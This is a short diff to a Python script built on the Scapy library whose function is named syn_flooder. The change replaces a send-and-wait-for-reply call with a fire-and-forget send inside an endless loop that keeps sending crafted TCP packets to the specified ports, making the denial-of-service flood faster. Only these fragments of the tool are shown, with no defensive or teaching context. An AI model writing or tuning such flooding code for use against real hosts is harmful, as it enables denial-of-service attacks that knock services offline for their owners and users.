@@ -1,4 +1,4 @@
-from scapy.all import IP, TCP, sr1, RandShort
+from scapy.all import IP, TCP, send, RandShort
 from subprocess import Popen, PIPE, call
 import argparse
 import platform
@@ -53,7 +53,7 @@ def syn_flooder(source_ip):
 	# Create the packet and continously send it to all the specified ports
 	pkt = ip/tcp
 	while True:
-		reply = sr1(pkt)
+		send(pkt, verbose = False)
 
 
 def main():
